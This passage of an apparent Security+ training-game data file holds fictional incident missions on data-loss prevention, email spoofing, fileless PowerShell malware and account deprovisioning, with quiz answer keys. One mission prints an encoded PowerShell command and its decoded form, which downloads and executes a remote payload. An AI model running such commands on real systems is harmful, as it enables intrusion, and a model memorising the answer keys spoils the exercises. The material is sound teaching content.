  • User training: Explain why policies exist, how to request exceptions

COMMON DLP CHALLENGES:
  • FALSE POSITIVES — Blocking legitimate business activity (over-tuning)
  • ENCRYPTED TRAFFIC — Can't inspect HTTPS without SSL decryption (privacy concerns)
  • PERFORMANCE IMPACT — Scanning large files slows network/endpoints
  • USER CIRCUMVENTION — Employees find workarounds (smartphone photos of screen, personal email)

Your organization had NONE of this. No data classification, no DLP policies, no monitoring. Sarah's activity would have been instantly visible with even basic DLP.`,
      critical: true
    },
    {
      id: 'dlp-03',
      type: 'log',
      label: 'Network Monitoring Tool Analysis',
      content: `NETWORK MONITORING TOOLS — Existing Infrastructure (Unused)

Your network team had deployed monitoring tools but never configured them for security use:

1. NetFlow:
   WHAT IT IS: Network protocol that collects metadata about traffic flows (source IP, destination IP, ports, protocols, byte counts). Routers/switches export NetFlow data to collector for analysis.
   
   WHAT IT SHOWS:
     - Top talkers (hosts sending/receiving most data)
     - Traffic patterns over time (baseline normal vs anomalies)
     - Unusual destinations (data leaving to untrusted IPs)
     - Protocol distribution (HTTP, HTTPS, SSH, etc.)
   
   WHAT IT DOESN'T SHOW:
     - Actual packet contents (it's metadata, not full capture)
     - Encrypted traffic payloads (sees HTTPS connection to dropbox.com but not file contents)
   
   YOUR NETFLOW STATUS: Enabled on core routers, data exported to collector, NO ONE REVIEWING IT
   
   What NetFlow would have shown:
     - Sarah's laptop sending 340GB to Dropbox over 18 days
     - Massive spike in outbound HTTPS traffic from her IP
     - Pattern: consistent 20GB/day to cloud storage destination

2. SNMP (Simple Network Management Protocol):
   WHAT IT IS: Protocol for monitoring and managing network devices. Devices expose MIB (Management Information Base) — database of manageable objects (CPU, memory, interface stats, errors).
   
   COMPONENTS:
     - OIDs (Object Identifiers) — Unique ID for each manageable object
     - TRAPS — Asynchronous alerts sent by device when thresholds exceeded
     - POLLING — Management system queries devices periodically
   
   SECURITY CONCERNS:
     - SNMPv1 and v2c use cleartext community strings (essentially passwords: "public", "private")
     - Default community strings are widely known (change them!)
     - SNMPv3 adds encryption and authentication
   
   YOUR SNMP STATUS: Enabled with default community strings, used for interface monitoring only
   
   What SNMP could provide:
     - Interface utilization spikes (Sarah's uploads saturating her switch port)
     - Bandwidth anomalies (20GB/day vs her 500MB/day baseline)

3. Antivirus / Anti-Malware:
   YOUR STATUS: Traditional signature-based AV on endpoints
   
   Why it didn't help:
     - Dropbox is legitimate software (not malware)
     - Data exfiltration via authorized cloud services isn't detected by AV
     - Modern threats: Insider risk, data theft, misuse of legitimate tools
     - Solution: Endpoint DLP + EDR (Endpoint Detection and Response)

4. Vulnerability Scanners:
   YOUR STATUS: Monthly scans for missing patches
   
   Why it didn't help:
     - Scanners find vulnerabilities, not insider data theft
     - Sarah didn't exploit vulnerabilities — she used her authorized access
     - Solution: DLP + User Behavior Analytics (UBA)`,
      critical: false
    },
    {
      id: 'dlp-04',
      type: 'alert',
      label: 'Behavioral Analytics — Retrospective',
      content: `USER AND ENTITY BEHAVIOR ANALYTICS (UEBA)

What UEBA would have detected (if deployed):

BASELINE NORMAL BEHAVIOR (Sarah's 6-year pattern):
  - Average data upload: 500MB/day (design files to corporate SharePoint)
  - Destinations: Corporate Office 365, internal file servers
  - Work hours: 8AM-5PM, minimal evening/weekend activity
  - Applications: Autodesk, Adobe Creative Suite, internal CAD tools

ANOMALOUS BEHAVIOR (final 3 weeks):
  - Data upload: 20GB/day (40x normal)
  - Destination: Personal Dropbox (never used before)
  - File access: Bulk download of entire product repository (247 projects, only worked on 12)
  - Access pattern: Methodical alphabetical traversal (automated script behavior)
  - Timing: Extended hours, weekend activity

UEBA RISK SCORE: 95/100 (CRITICAL — Insider Threat Indicator)

Insider threat indicators Sarah exhibited:
  ✓ Notice of resignation (context: leaving for competitor)
  ✓ Anomalous data access (bulk download of files outside assigned projects)
  ✓ Use of personal cloud storage (policy violation)
  ✓ Unusual volume of data transfer
  ✓ Off-hours activity (weekends, evenings)
  ✓ Attempt to cover tracks (deleted local copies after upload)

MONITORING ARCHITECTURE — AGENTS vs AGENTLESS:

AGENT-BASED (endpoint DLP agent on Sarah's laptop):
  ✓ Visibility: File operations, clipboard, screen capture, print jobs, USB
  ✓ Control: Block unauthorized uploads in real-time
  ✓ Offline: Works even if laptop disconnected from network
  ✗ Deployment: Requires software installation, updates, management
  ✗ Performance: CPU/memory impact on endpoint
  ✗ Evasion: User with admin rights can disable agent

AGENTLESS (network DLP appliance):
  ✓ Deployment: No endpoint software needed
  ✓ Performance: No endpoint impact
  ✓ Visibility: All network traffic from all devices
  ✗ Encrypted traffic: Can't inspect HTTPS without SSL decryption
  ✗ Offline: Can't monitor laptop activity when off-network (VPN bypass)
  ✗ Endpoint actions: Can't see local file copies, USB transfers, screenshots

BEST PRACTICE: Deploy BOTH. Agent-based for endpoint visibility, agentless for network perimeter.`,
      critical: false
    },
    {
      id: 'dlp-05',
      type: 'witness',
      label: 'Post-Incident Interviews',
      content: `Interview with Sarah Chen (via legal counsel):

"I didn't think I was doing anything wrong. I worked on those designs for 6 years — I considered them 'my work.' I wanted to keep a portfolio for future job applications. The company never told me I couldn't use Dropbox. There was no policy, no training, no technical controls stopping me. If it was really sensitive, why was it so easy to upload?"

LESSON: Lack of policy communication and technical controls = ambiguity and risk.

Interview with IT Security Manager:

"We've been requesting budget for DLP for 3 years. Every year it gets cut. Leadership sees it as 'optional' — we've never had a data breach, so why spend $200K on prevention? Well, now we have a data breach, and the IP loss is estimated at $15M in competitive advantage. The math was always in favor of DLP, but no one wanted to spend money on a problem that 'hadn't happened yet.'"

Interview with Network Administrator:

"We have NetFlow data going back 2 years. I just pulled Sarah's traffic history — clear as day, massive spike in uploads starting exactly when she gave notice. The data was sitting there the whole time. We just don't have anyone watching it. I use NetFlow for capacity planning, not security. No one from the security team ever asked for access."

LESSON: Security tools are worthless if no one monitors them.

Interview with Legal Counsel:

"We're pursuing legal action against Sarah and the competitor, but realistically, once the data is out there, the damage is done. We can get an injunction preventing use of the designs, but they've already seen them. Our patents might not hold up because she contributed to the designs. This is why technical controls (DLP) are critical — legal remedies are slow and uncertain. Prevention is everything."

COMPLIANCE IMPACT:

If this data included customer PII (it did — contracts with customer info):
  • GDPR breach notification required
  • State data breach laws triggered (California, NY, etc.)
  • Customer notification costs
  • Regulatory investigation

If it included payment card data or healthcare info:
  • PCI DSS or HIPAA violations
  • Mandatory forensic audits
  • Regulatory fines`,
      critical: false
    }
  ],

  challenge: {
    question: 'Which security tool would have been MOST effective at detecting and preventing Sarah\'s data exfiltration in real-time?',
    options: [
      'SNMP monitoring to detect bandwidth utilization anomalies on network switches',
      'Endpoint DLP agent configured to block unauthorized cloud storage uploads',
      'NetFlow analysis to identify unusual outbound traffic patterns',
      'Vulnerability scanner to detect missing patches on the employee\'s laptop'
    ],
    correctIndex: 1,
    rationales: [
      'INCORRECT: SNMP monitoring could detect bandwidth anomalies (high utilization) but only AFTER the fact, and it provides no enforcement. It would show "something used a lot of bandwidth" but not what data was transferred or to where. SNMP is a diagnostic tool, not a security control.',
      'CORRECT: Endpoint DLP agent would detect CAD files and sensitive data being copied to personal Dropbox, block the transfer in real-time based on policy (unauthorized cloud storage), alert security team, and log the attempt. DLP is purpose-built for preventing data exfiltration. It combines detection (content inspection, file fingerprinting) with enforcement (block, quarantine, encrypt).',
      'INCORRECT: NetFlow would identify Sarah\'s laptop sending large volumes of data to Dropbox IPs, but NetFlow is passive monitoring — it records metadata but doesn\'t block anything. It would be valuable for investigation and detection, but wouldn\'t prevent the exfiltration. By the time NetFlow data is analyzed, the data is already gone.',
      'INCORRECT: Vulnerability scanners find software flaws and missing patches. Sarah didn\'t exploit any vulnerabilities — she used her authorized account and legitimate access to copy files. Vulnerability scanning is irrelevant to insider threat scenarios involving authorized access abuse.'
    ]
  },

  debrief: `This incident demonstrates CompTIA Objective 4.4: Data Loss Prevention and Security Monitoring Tools. DLP protects data in three states: at rest, in motion, and in use. It requires data classification, detection methods, and policy-driven responses.

Key concepts learned:
  - DLP TYPES: Endpoint (agent on device), Network (inline appliance), Cloud (SaaS API), Email (gateway)
  - DLP DETECTION: Content inspection, document fingerprinting, contextual analysis, ML anomaly detection
  - DLP RESPONSE: Monitor, alert, prompt, block, quarantine, encrypt
  - NetFlow: Metadata about traffic flows (source, destination, volume, protocol) — great for pattern detection, not content inspection
  - SNMP: Device management protocol, MIB (database), OIDs (object IDs), traps (alerts) — use SNMPv3 for security
  - AGENTS vs AGENTLESS: Installed software (detailed visibility, offline capability) vs remote monitoring (no deployment, network-only)
  - UEBA: User behavior analytics to detect insider threats
  - ANTI-VIRUS vs DLP: AV finds malware, DLP prevents data theft (different problems)

Insider threats require different controls than external attacks: DLP, UEBA, least privilege, monitoring.`,

  escalation: `Sarah exfiltrated 340GB of product designs representing 6 years of R&D investment. The intellectual property included unreleased next-generation products planned for launch in 8 months. Three months after Sarah joins the competitor, they announce a product with suspiciously similar features and design. Legal files a lawsuit for trade secret theft and seeks an injunction, but the competitor claims independent development. The case drags on for 2 years at a cost of $1.8M in legal fees. Meanwhile, your product launch is delayed by 6 months (trying to redesign around what was leaked), costing $4.2M in lost revenue. The board mandates immediate DLP deployment across all endpoints and network perimeters, UEBA for insider threat detection, and enhanced offboarding procedures (revoke access immediately upon notice, review all data access during final weeks, exit interviews with IT security present). Total incident cost: $8.3M. The DLP budget request was $200K.`,

  refs: [
    { source: 'Study Guide', section: '4.4 - Data Loss Prevention', page: 75 },
    { source: 'Study Guide', section: '4.4 - Network Monitoring Tools', page: 76 },
    { source: 'Study Guide', section: '4.4 - SNMP and NetFlow', page: 77 },
    { source: 'Study Guide', section: '5.5 - Insider Threats', page: 93 }
  ]
},

// ============================================================
  // DOMAIN 4 — Security Operations (Obj 4.5)
  // Teaches: Email Security (SPF, DKIM, DMARC, Mail Gateway)
  // ============================================================
  {
    id: 'MISSION-029',
    title: 'The Ghost Sender',
    domain: 'Security Operations',
    objectiveCodes: ['4.5'],
    threatLevel: 'high',
    tags: ['Email Security', 'SPF', 'DKIM', 'DMARC', 'Phishing', 'Mail Gateway'],
    briefing: `SECURITY INCIDENT: A sophisticated phishing campaign is actively targeting your employees. 43 users received emails that appear to be from your CEO requesting urgent wire transfers. The emails bypass your spam filter and display "from: ceo@yourcompany.com" — your legitimate domain. Two employees nearly completed the transfers before calling IT. Your email security gateway logs show no rejected messages. The security team needs you to investigate how attackers are spoofing your domain and why your email security controls failed to stop it.`,

    intel: [
      {
        id: 'ghost-01',
        type: 'forensic',
        label: 'Email Header Analysis',
        content: `PHISHING EMAIL FORENSIC BREAKDOWN:

Display Header:
  From: "John Chen, CEO" <ceo@yourcompany.com>
  Subject: URGENT: Wire Transfer Authorization Required

Actual Email Headers (technical view):
  Return-Path: <attacker@malicious-server.net>
  Received: from mail.attacker-infrastructure.com (185.234.72.99)
  Authentication-Results: NONE
    SPF: NONE (no SPF record checked)
    DKIM: NONE (no signature present)
    DMARC: NONE (no policy enforced)

The "From" field in an email is easily forged — it's like writing a fake return address on a postal envelope. The attacker's mail server simply claimed to be sending on behalf of yourcompany.com. Without proper email authentication protocols, the receiving server had no way to verify this claim.

Your mail gateway accepted the email because:
  1. No SPF check was performed (no DNS record to validate sending server)
  2. No DKIM signature was required (no cryptographic proof of authenticity)
  3. No DMARC policy was enforced (no instruction on what to do with failures)`,
        critical: true
      },
      {
        id: 'ghost-02',
        type: 'log',
        label: 'DNS Configuration Audit',
        content: `DNS QUERY RESULTS — yourcompany.com:

TXT Records (email authentication):
  SPF: MISSING — No record found
  DKIM: MISSING — No public key published
  DMARC: MISSING — No policy record

WHAT SHOULD EXIST:

SPF (Sender Policy Framework):
  Example: "v=spf1 ip4:203.0.113.0/24 include:_spf.google.com -all"
  Translation: "Only these IP addresses are authorized to send email for this domain. Reject (-all) everything else."
  Receiving servers check: "Is the sending IP on the approved list?"

DKIM (DomainKeys Identified Mail):
  Example DNS: "v=DKIM1; k=rsa; p=MIGfMA0GCS..." (public key)
  How it works: Your mail server cryptographically signs outgoing emails with a private key. Recipients use the public key (published in DNS) to verify the signature. If the signature is valid, the email wasn't tampered with and came from an authorized server.

DMARC (Domain-based Message Authentication):
  Example: "v=DMARC1; p=reject; rua=mailto:dmarc@yourcompany.com"
  Translation: "If SPF or DKIM fails, REJECT the email. Send reports to this address."
  DMARC tells receiving servers what to do when authentication fails: none (just monitor), quarantine (send to spam), or reject (block entirely).

Without these records, any attacker can claim to send email from yourcompany.com — and receiving servers have no basis to reject it.`,
        critical: true
      },
      {
        id: 'ghost-03',
        type: 'report',
        label: 'Email Security Gateway Review',
        content: `MAIL GATEWAY CONFIGURATION ANALYSIS:

Current Settings (Cisco Email Security Appliance):
  - Anti-spam: ENABLED (signature-based detection)
  - Anti-virus: ENABLED (malware scanning)
  - URL filtering: ENABLED (blocks known malicious links)
  - SPF validation: DISABLED
  - DKIM validation: DISABLED
  - DMARC enforcement: DISABLED

The gateway is protecting against known malware and malicious URLs, but it's NOT validating sender authenticity. This is like having a security guard who checks bags for weapons but doesn't verify anyone's ID.

Email Security Layers Explained:

1. Mail Gateway (Secure Email Gateway / SEG):
   - Sits at the network perimeter
   - Scans all inbound/outbound email
   - Can enforce: spam filtering, malware scanning, DLP, SPF/DKIM/DMARC validation
   - Common vendors: Proofpoint, Mimecast, Cisco ESA, Microsoft Defender

2. SPF/DKIM/DMARC (Email Authentication):
   - SPF: Validates sending server IP against DNS whitelist
   - DKIM: Cryptographic signature proves message integrity
   - DMARC: Policy that tells receiving servers what to do when SPF/DKIM fails

The gateway has the CAPABILITY to enforce these protocols, but the feature is disabled — likely because your domain doesn't have the DNS records configured. Enabling enforcement without DNS records would block legitimate email from your own domain.`,
        critical: false
      },
      {
        id: 'ghost-04',
        type: 'alert',
        label: 'Threat Intelligence Correlation',
        content: `ATTACK CAMPAIGN PROFILE:

Attacker Infrastructure:
  - Sending server: mail.attacker-infrastructure.com (185.234.72.99)
  - Domain reputation: POOR (flagged by 4 threat intelligence feeds)
  - Historical activity: 2,847 phishing emails sent in past 48 hours
  - Target sectors: Finance, Healthcare, Manufacturing

Attack Pattern:
  1. Reconnaissance: Identify companies with no DMARC policy (publically queryable in DNS)
  2. Email spoofing: Send emails claiming to be from CEO/CFO
  3. Social engineering: Urgent wire transfer requests
  4. Bypass: Works against any organization without SPF/DKIM/DMARC

The attacker specifically targets organizations with missing email authentication because it's trivially easy to spoof. A simple DMARC DNS query reveals which companies are vulnerable.

Command to check if a domain has DMARC:
  dig TXT _dmarc.yourcompany.com

If no record exists, the domain is spoofable with near-zero effort.`,
        critical: false
      },
      {
        id: 'ghost-05',
        type: 'witness',
        label: 'Employee Interviews',
        content: `INTERVIEW EXCERPTS:

Employee #1 (Finance):
"The email looked completely legitimate. It came from the CEO's email address — I verified it said ceo@yourcompany.com. The signature block matched his normal emails. It requested a $45,000 wire transfer for an 'urgent vendor payment.' I was about to approve it when I decided to call his assistant to confirm. That's when I found out it was fake."

Employee #2 (Accounting):
"We receive wire transfer requests from executives regularly. This one looked normal except the tone was a bit more urgent than usual. There was no indication it was fraudulent — no spelling errors, no suspicious links, nothing. If I hadn't noticed the CEO was actually in an all-day offsite meeting with no phone access, I probably would have processed it."

Common theme: The emails were convincing because they appeared to originate from a trusted domain. Users are trained to verify the sender's email address, but they don't know that email addresses can be trivially spoofed without proper authentication protocols.`,
        critical: false
      }
    ],

    challenge: {
      question: 'Based on your investigation, what should be deployed FIRST to prevent this email spoofing attack from succeeding again?',
      options: [
        'Enable two-factor authentication for all email accounts',
        'Configure SPF, DKIM, and DMARC DNS records with enforcement policy',
        'Deploy an endpoint detection and response (EDR) solution',
        'Implement full-disk encryption on all employee devices'
      ],
      correctIndex: 1,
      rationales: [
        'INCORRECT: Two-factor authentication (MFA) protects user accounts from credential theft. It does NOT prevent external attackers from spoofing your domain in emails they send from their own servers. MFA is important, but it doesn\'t address email authentication.',
        'CORRECT: SPF, DKIM, and DMARC are the industry-standard email authentication protocols. SPF whitelists authorized sending servers in DNS. DKIM cryptographically signs emails. DMARC tells receiving servers to reject emails that fail SPF/DKIM checks. With DMARC set to "p=reject", spoofed emails claiming to be from yourcompany.com would be blocked by receiving servers.',
        'INCORRECT: EDR protects endpoints from malware and malicious behavior. It operates at the device level and doesn\'t validate email sender authenticity. EDR wouldn\'t stop the phishing emails from reaching inboxes.',
        'INCORRECT: Full-disk encryption protects data at rest on physical devices. It has zero effect on email transmission or sender validation. Encryption is important for data protection, but it doesn\'t address email spoofing.'
      ]
    },

    debrief: `This investigation covers CompTIA Objective 4.5: Email Security. The attack succeeded because your domain lacked email authentication protocols (SPF, DKIM, DMARC), allowing attackers to trivially spoof the CEO's email address.

Key concepts learned:
  - Email "From" addresses are easily forged without authentication protocols
  - SPF validates sending server IPs against a DNS whitelist
  - DKIM adds cryptographic signatures to emails (proves integrity and authenticity)
  - DMARC is the policy layer that tells receiving servers what to do when SPF/DKIM fails
  - Email security gateways can enforce these protocols but need DNS records configured first
  - DMARC policies: p=none (monitor only), p=quarantine (send to spam), p=reject (block)
  - Without DMARC, anyone can send emails claiming to be from your domain`,

    escalation: `The phishing campaign continues for 6 more hours before being manually identified. A total of 127 employees receive the spoofed CEO emails. One accounting clerk processes a $78,000 fraudulent wire transfer before the campaign is discovered. The funds are unrecoverable. Your company must now disclose the breach to customers and faces regulatory scrutiny for failing to implement industry-standard email authentication controls that have been best practice since 2015.`,

    refs: [
      { source: 'Study Guide', section: '4.5 - Email Security', page: 72 },
      { source: 'Study Guide', section: '4.5 - Secure Protocols', page: 74 }
    ]
  },

  // ============================================================
  // DOMAIN 4 — Security Operations (Obj 4.5)
  // Teaches: EDR, XDR, Endpoint Security, Behavioral Analysis
  // ============================================================
  {
    id: 'MISSION-030',
    title: 'The Silent Invader',
    domain: 'Security Operations',
    objectiveCodes: ['4.5'],
    threatLevel: 'critical',
    tags: ['EDR', 'XDR', 'Endpoint Security', 'Fileless Malware', 'Behavioral Analysis'],
    briefing: `CRITICAL ALERT: Your antivirus console shows all systems clean, but your EDR solution just triggered a high-severity behavioral alert on three workstations in the Finance department. The alert indicates "suspicious PowerShell execution with obfuscated commands and network callbacks to an unknown IP." No files were written to disk, and traditional antivirus found nothing. The EDR quarantined the processes, but the security team needs you to investigate what this fileless attack was attempting and why traditional antivirus completely missed it.`,

    intel: [
      {
        id: 'silent-01',
        type: 'alert',
        label: 'EDR Behavioral Alert',
        content: `EDR DETECTION EVENT — CrowdStrike Falcon Alert:

Affected Hosts:
  - FIN-WKS-07 (10.10.20.47) — User: smorgan
  - FIN-WKS-11 (10.10.20.51) — User: jdavis  
  - FIN-WKS-19 (10.10.20.59) — User: kpatel

Detection: Malicious Behavioral Pattern — Fileless Attack
  - Suspicious parent process: WINWORD.EXE (Microsoft Word)
  - Child process: PowerShell.exe with obfuscated Base64-encoded commands
  - Network connection: 198.51.100.77:443 (unknown external IP, flagged malicious)
  - Registry modification: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run (persistence)
  - Credential access: LSASS memory read attempt (credential dumping behavior)

Traditional Signature-Based Antivirus Status: NO DETECTIONS

Why EDR caught it but AV didn't:
  - EDR uses BEHAVIORAL ANALYSIS — it monitors process execution, command-line arguments, network connections, registry changes, and memory access patterns
  - Signature-based AV scans FILES for known malware patterns — if there's no malicious file written to disk, AV has nothing to scan
  - This was a FILELESS attack — the malware ran entirely in memory using legitimate system tools (PowerShell, WMI)`,
        critical: true
      },
      {
        id: 'silent-02',
        type: 'forensic',
        label: 'PowerShell Command Analysis',
        content: `DECODED POWERSHELL PAYLOAD:

Original (obfuscated):
  powershell.exe -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADgALgA1ADEALgAxADAAMAAuADcANwAvAHAAYQB5AGwAbwBhAGQAJwApAA==

Decoded to readable text:
  IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.77/payload')

Translation:
  - IEX = Invoke-Expression (executes downloaded code)
  - Downloads a secondary payload from attacker's server
  - Runs entirely in memory — NO FILE WRITTEN TO DISK

Attack Flow (Fileless Malware):
  1. User opens malicious Word document (phishing email)
  2. Macro executes, launching PowerShell with hidden window
  3. PowerShell downloads malicious code from C2 server
  4. Code runs in memory — reconnaissance, credential theft, lateral movement
  5. Persistence: Registry key ensures PowerShell command runs at every boot
  6. No traditional malware file exists on disk — signature-based AV sees nothing

EDR DETECTION LOGIC — What triggered the alert:
  - Abnormal: Microsoft Word spawning PowerShell (suspicious parent-child relationship)
  - Obfuscation: Base64-encoded command (evasion technique)
  - Network: PowerShell making outbound HTTP connection (C2 communication)
  - Privilege: Attempted access to LSASS process (credential dumping)
  - Persistence: Registry Run key modification (survival after reboot)`,
        critical: true
      },
      {
        id: 'silent-03',
        type: 'log',
        label: 'Antivirus Scan Logs',
        content: `TRADITIONAL ANTIVIRUS REPORT (Symantec Endpoint Protection):

Full System Scans — FIN-WKS-07, FIN-WKS-11, FIN-WKS-19:
  Scan Time: 14:30 UTC
  Files Scanned: 487,293
  Threats Detected: 0
  Action Taken: None

Real-Time Protection Status: ENABLED
  - File system monitoring: Active
  - Email scanning: Active
  - Web protection: Active
  - Signature database: Up to date (last update: 6 hours ago)

WHY ANTIVIRUS FAILED:

Signature-based antivirus works by:
  1. Scanning files on disk
  2. Comparing file hashes and patterns against a database of known malware signatures
  3. Blocking or quarantining matches

Fileless malware bypasses this by:
  - Never writing a malicious .exe or .dll file to disk
  - Running code directly in memory using legitimate system binaries (PowerShell, WMI, regsvr32)
  - Using obfuscation (encoding, encryption) so even if intercepted, the payload doesn't match known signatures

This is why NEXT-GENERATION endpoint protection is critical:
  - EDR (Endpoint Detection and Response): Behavioral monitoring, process analysis, threat hunting
  - XDR (Extended Detection and Response): EDR + network + cloud + email telemetry correlated across the entire environment`,
        critical: false
      },
      {
        id: 'silent-04',
        type: 'report',
        label: 'Threat Intelligence Brief',
        content: `FILELESS MALWARE ATTACK OVERVIEW:

Common Techniques (MITRE ATT&CK Framework):
  - T1059.001: PowerShell execution
  - T1027: Obfuscated command-line arguments
  - T1055: Process injection (running code in legitimate process memory)
  - T1003: Credential dumping (LSASS memory access)
  - T1547.001: Registry Run Keys for persistence

Why Fileless Attacks Are Effective:
  - Evade signature-based detection (no malware file to scan)
  - Abuse built-in system tools (PowerShell, WMI, WMIC) — "living off the land"
  - Harder to forensically analyze (no artifacts left on disk)
  - Operate entirely in volatile memory (cleared on reboot)

Endpoint Security Evolution:
  
Traditional AV (Signature-Based):
  - Scans files for known malware patterns
  - Reactive: Only detects threats already in the signature database
  - Useless against fileless and zero-day attacks

EDR (Endpoint Detection and Response):
  - Behavioral analysis: monitors process execution, network connections, registry changes
  - Machine learning: identifies anomalous behavior even without signatures
  - Threat hunting: security analysts query endpoint telemetry to find hidden threats
  - Incident response: remote isolation, process termination, forensic data collection

XDR (Extended Detection and Response):
  - EDR + network traffic + cloud workloads + email + identity
  - Correlates signals across the entire environment
  - Example: EDR sees PowerShell execution, network logs see C2 traffic, email gateway sees the original phishing email — XDR connects all three into one incident`,
        critical: false
      },
      {
        id: 'silent-05',
        type: 'witness',
        label: 'User Interviews',
        content: `INTERVIEW — smorgan (Finance Analyst, FIN-WKS-07):

"I received an email this morning that looked like it was from our bank — it had an attached invoice for a payment we were expecting. The email said to open the Word document and enable macros to view the invoice properly. I enabled macros because we do that all the time for legitimate vendor invoices."

"About 10 minutes later, my computer got really slow for a few seconds, then went back to normal. I didn't see any virus warnings or anything unusual. Then IT called me saying my workstation was quarantined by the security system."

INTERVIEW — jdavis (Accounts Payable, FIN-WKS-11):

"Same thing — I got the invoice email, opened the document, enabled macros. My antivirus didn't warn me about anything, so I assumed it was safe. I've been working on spreadsheets all morning and everything seemed fine until IT remotely locked my computer."

Key observation: Users are conditioned to enable macros for legitimate business documents. The phishing email exploited this business process. The attack was completely invisible to the users and to traditional antivirus — only behavioral monitoring (EDR) detected the malicious activity.`,
        critical: false
      }
    ],

    challenge: {
      question: 'Based on your investigation, what capability allowed the EDR system to detect this attack when traditional antivirus failed?',
      options: [
        'EDR has a larger signature database that includes more malware variants',
        'EDR performs behavioral analysis of process execution and system calls',
        'EDR encrypts all endpoint communications to prevent interception',
        'EDR automatically patches vulnerabilities on endpoints'
      ],
      correctIndex: 1,
      rationales: [
        'INCORRECT: EDR does NOT rely on signature databases. That\'s the fundamental limitation of traditional antivirus. EDR uses behavioral analysis, machine learning, and anomaly detection — not signature matching.',
        'CORRECT: EDR monitors endpoint behavior in real-time: process parent-child relationships, command-line arguments, network connections, registry changes, memory access. When PowerShell (spawned by Word) made network connections to a suspicious IP and attempted to read LSASS memory, EDR flagged this as malicious behavior even though no malware file existed on disk.',
        'INCORRECT: Communication encryption is unrelated to malware detection. EDR detects threats through behavioral monitoring, not by encrypting traffic.',
        'INCORRECT: Automated vulnerability patching is a separate function (patch management). EDR focuses on detecting and responding to active threats, not preventing vulnerabilities.'
      ]
    },

    debrief: `This incident demonstrates CompTIA Objective 4.5: Endpoint Security. Traditional signature-based antivirus failed because the attack was fileless — no malicious executable was written to disk. The malware ran entirely in memory using PowerShell.

Key concepts learned:
  - Fileless malware abuses legitimate system tools (PowerShell, WMI) to evade signature-based detection
  - Signature-based AV scans files; if there's no file, there's nothing to detect
  - EDR uses behavioral analysis: monitoring process execution, network activity, registry changes, memory access
  - XDR extends EDR by correlating endpoint data with network, cloud, email, and identity telemetry
  - User behavior analytics can detect anomalous activity even when the attack uses valid credentials
  - "Living off the land" attacks use built-in Windows tools to blend in with normal activity`,

    escalation: `The EDR quarantine prevented the attack from spreading beyond the initial three workstations. Forensic analysis reveals the attacker gained valid credentials from one compromised machine and was 7 minutes away from deploying ransomware across the file server when EDR blocked the activity. Without EDR, the attack would have gone completely undetected until ransomware encrypted the entire Finance department's shared drives. The incident prompts an immediate rollout of EDR to all endpoints and a mandatory security awareness campaign about macro-enabled documents.`,

    refs: [
      { source: 'Study Guide', section: '4.5 - Endpoint Security', page: 70 },
      { source: 'Study Guide', section: '2.3 - Malware Attacks', page: 28 }
    ]
  },

  // ============================================================
  // DOMAIN 4 — Security Operations (Obj 4.6)
  // Teaches: IAM Lifecycle, Provisioning/Deprovisioning, Access Reviews
  // ============================================================
  {
    id: 'MISSION-031',
    title: 'The Forgotten Account',
    domain: 'Security Operations',
    objectiveCodes: ['4.6'],
    threatLevel: 'critical',
    tags: ['IAM', 'Identity Lifecycle', 'Deprovisioning', 'Access Control', 'Privilege Creep'],
    briefing: `BREACH ALERT: At 02:47 this morning, unauthorized access was detected from a former employee's account. The user, Sarah Mitchell, left the company 4 months ago — yet her account successfully authenticated via VPN, accessed the engineering file share, and downloaded 2.3 GB of proprietary source code. The files were exfiltrated to an external cloud storage service. HR confirmed Sarah's termination was processed correctly on her last day. Your CISO needs you to investigate how a terminated employee's account remained active and what IAM processes failed.`,

    intel: [
      {
        id: 'forgot-01',
        type: 'log',
        label: 'Authentication and VPN Logs',
        content: `VPN ACCESS LOG — 02:47:14 UTC:

Username: smitchell
Authentication: SUCCESS
  - MFA: BYPASSED (account flagged as "service account" — MFA not required)
  - Source IP: 203.0.113.88 (residential ISP, Chicago)
  - VPN session duration: 47 minutes
  - Data transferred: 2.3 GB outbound

Active Directory Account Status:
  - Account: smitchell
  - Status: ENABLED
  - Last password change: 119 days ago (before termination)
  - Group memberships: Engineering, VPN-Access, Source-Code-Readers, Developers
  - Manager field: [NULL] — manager departed 6 months ago, field never updated

File Server Audit Log:
  02:48 — smitchell accessed \\\\fileserver\\Engineering\\SourceCode\\
  02:51 — Downloaded: Project_Phoenix_v2.7.zip (1.2 GB)
  03:05 — Downloaded: API_Keys_Production.txt (4 KB)
  03:12 — Downloaded: Customer_Database_Schema.sql (847 MB)
  03:34 — Disconnected

Cloud Access Security Broker (CASB) Alert:
  03:18 — User smitchell uploaded 2.3 GB to personal Dropbox account from corporate network

The account was never disabled after termination. It retained full engineering access 4 months after the employee left.`,
        critical: true
      },
      {
        id: 'forgot-02',
        type: 'report',
        label: 'HR Offboarding Analysis',
        content: `HR OFFBOARDING TICKET REVIEW — Sarah Mitchell:

Termination Date: October 12 (4 months ago)
Departure Type: Voluntary resignation
Manager: [No longer with company — left 6 months ago]

Offboarding Checklist (HR System):
  ✓ Final paycheck processed
  ✓ Benefits termination scheduled
  ✓ Exit interview completed
  ✓ Badge returned to security desk
  ✓ Laptop returned to IT asset management
  ✗ Active Directory account disabled — NEVER COMPLETED

The offboarding ticket was assigned to the departed manager for approval. When the manager left the company, orphaned tickets in the queue were never reassigned. IT never received the account deactivation request.

IAM LIFECYCLE FAILURE POINTS:

1. PROVISIONING (creating accounts):
   - Identity proofing: verify the person is who they claim to be
   - Permission assignment: grant access based on job role
   - Manager approval workflow

2. ACCOUNT MAINTENANCE:
   - Access reviews: quarterly validation that users still need their current access
   - Privilege creep: users accumulate permissions over time; never removed when changing roles
   - Recertification: periodic attestation by managers

3. DEPROVISIONING (removing access):
   - Termination-triggered automation (integrate HR system with AD)
   - Account disablement on last working day
   - Removal from all groups, distribution lists, VPN access
   - Password invalidation

This organization failed at deprovisioning. There was no automated link between the HR termination and Active Directory account lifecycle.`,
        critical: true
      },
      {
        id: 'forgot-03',
        type: 'forensic',
        label: 'Account Permission History',
        content: `ACTIVE DIRECTORY PERMISSION AUDIT — smitchell account:

Account created: 3 years ago (initial hire date)

Permission grants over time (PRIVILEGE CREEP):
  - Year 1: Engineering group (normal for role)
